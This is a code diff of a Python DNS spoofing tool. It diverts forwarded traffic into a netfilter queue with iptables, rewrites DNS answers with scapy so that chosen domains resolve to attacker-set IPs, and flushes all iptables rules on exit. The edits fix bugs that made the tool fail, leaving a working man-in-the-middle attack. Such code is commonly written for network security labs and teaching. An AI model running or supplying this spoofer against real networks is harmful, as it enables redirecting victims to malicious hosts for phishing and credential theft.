@@ -8,23 +8,23 @@ class DNS:
     def __init__(self, replacement_map, queue_num, use_print = True):
         self.map = replacement_map
         self.num = queue_num
-        self.print = use_print
+        self.use_print = use_print
         self.queue = NetfilterQueue()
 
     def spoof(self):
-        iPrint("Starting DNS spoof")
+        self.iPrint("Starting DNS spoof")
         # insert the iptables FORWARD rule
-        os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+        os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(self.num))
         try:
             # bind the queue number to our callback `process_packet`
             # and start it
-            queue.bind(self.num, queue_callback)
-            queue.run()
+            self.queue.bind(self.num, self.queue_callback)
+            self.queue.run()
         except KeyboardInterrupt:
             # if want to exit, make sure we
             # remove that rule we just inserted, going back to normal.
             os.system("iptables --flush")
-            iPrint("Finishing DNS spoof")
+            self.iPrint("Finishing DNS spoof")
 
     def queue_callback(self, packet):
         """
@@ -38,11 +38,12 @@ class DNS:
             # modify the packet
             print("[Before]:", scapy_packet.summary())
             try:
-                scapy_packet = modify_packet(scapy_packet)
+                scapy_packet = self.modify_packet(scapy_packet)
             except IndexError:
                 # not UDP packet, this can be IPerror/UDPerror packets
                 pass
             print("[After ]:", scapy_packet.summary())
+            print("")
             # set back as netfilter queue packet
             packet.set_payload(bytes(scapy_packet))
         # accept the packet
@@ -65,7 +66,8 @@ class DNS:
         # craft new answer, overriding the original
         # setting the rdata for the IP we want to redirect (spoofed)
         # for instance, google.com will be mapped to "192.168.1.100"
-        packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
+        packet[DNS].an = DNSRR(rrname=qname, rdata=self.map[qname])
+        print("Did modification:",qname)
         # set the answer count to 1
         packet[DNS].ancount = 1
         # delete checksums and length of packet, because we have modified the packet
